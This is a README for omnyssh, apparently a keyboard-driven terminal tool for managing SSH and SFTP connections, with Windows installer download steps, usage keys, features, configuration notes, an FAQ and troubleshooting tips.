# 🖥️ omnyssh - Manage your network connections with speed

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/meadtrue7477/omnyssh/releases)

Omnyssh provides a fast way to handle your SSH connections. You use your keyboard to navigate through your servers. This tool runs inside your terminal. It helps you organize and open connections without using a mouse. People who manage servers or remote machines will find this helpful.

## 📥 Getting Started

You can install this software on your Windows computer. Follow these steps to get the program running on your machine.

1. Go to the [official release page](https://github.com/meadtrue7477/omnyssh/releases).
2. Look for the Assets section under the latest version.
3. Click the link ending in .exe to download the installer.
4. Save the file to your computer.
5. Open the downloaded file to install the program.

## ⌨️ How to use omnyssh

This program works inside a terminal window. You do not need to install extra software for the core features. Open your Windows terminal or Command Prompt after the installation finishes. Type the name of the program to start.

- **Navigate:** Use your arrow keys to move through the list of servers.
- **Select:** Press the Enter key to connect to the highlighted server.
- **Quit:** Press the Q key to exit the program.
- **Search:** Start typing to filter your server list instantly.

The interface helps you see all your saved connections at once. You do not need to remember long commands. Everything stays inside the list.

## ⚙️ Features

This tool includes functionality for daily tasks. It focuses on speed and ease of use.

*   **Keyboard control:** Every action happens through key combinations. You keep your hands on the keyboard.
*   **Search filter:** A fast search bar finds your servers in milliseconds.
*   **Connection storage:** Save your hostnames, usernames, and key paths in one file.
*   **SFTP support:** Move files between your computer and remote servers using the same interface.
*   **Native performance:** The Rust codebase makes the program highly responsive on older hardware.

## 📁 Setting up your connections

Omnyssh uses a simple configuration file. You create a text file to list your servers. The program looks for this file when it starts. If you have not created one yet, the program will prompt you to generate a default template.

Place your host details in the configuration file. Use clear labels for each server. This helps you identify them when you search. You can save multiple groups of servers. This helps if you manage different types of environments.

## 🛠️ System Requirements

Your computer needs minimal resources to run this program. You do not need high-end hardware.

- **Operating System:** Windows 10 or Windows 11.
- **Memory:** 128 MB of free RAM is enough.
- **Storage:** Less than 10 MB on your hard drive.
- **Network:** An active internet connection for SSH and SFTP access.

The program creates a small footprint on your system. It does not run background tasks when you close the window.

## ❓ Frequently Asked Questions

**Do I need to install Rust to run this?**
No. The installer handles everything required to run the program. You do not need to understand programming languages to use this tool.

**Where does the program save my data?**
It saves your configuration in your user folder. This keeps your server details in one safe location.

**Does it support multiple SSH keys?**
Yes. You can specify the path to your key file in the configuration for each server.

**How do I update the software?**
Visit the [download page](https://github.com/meadtrue7477/omnyssh/releases) again. Download the newest installer and run it. The new version will replace the old one automatically.

**Can I export my list of servers?**
Because the list is a text file, you can copy it to a thumb drive or sync it across machines. You control the file entirely.

## 🛡️ Privacy and Safety

This software keeps your information on your local computer. It does not send your passwords or server lists to a third-party server. Your keys stay in your encrypted storage provided by Windows. You control who has access to your configuration file. Always store your private keys in a secure directory on your computer.

## 📈 Tips for Power Users

You can group servers by project. Name your servers with prefixes like "dev-" or "prod-" to filter them easily in the search bar. If you have many servers, use the search bar as your primary way to find the one you need. The program updates the screen instantly as you type. This keeps your workflow fast and efficient. You do not need to wait for the interface to catch up with your typing.

## 🔍 Troubleshooting

If the program fails to start, check if your terminal window is active. Ensure you have network access to the server you want to reach. If a connection fails, check your SSH key permissions. Windows sometimes limits access to certain folders. Move your keys to a folder inside your user directory if you encounter permission errors. Most issues stem from incorrect hostnames or expired SSH keys. If you get stuck, restart the terminal and try again. The program logs errors to the terminal so you can see why a connection failed.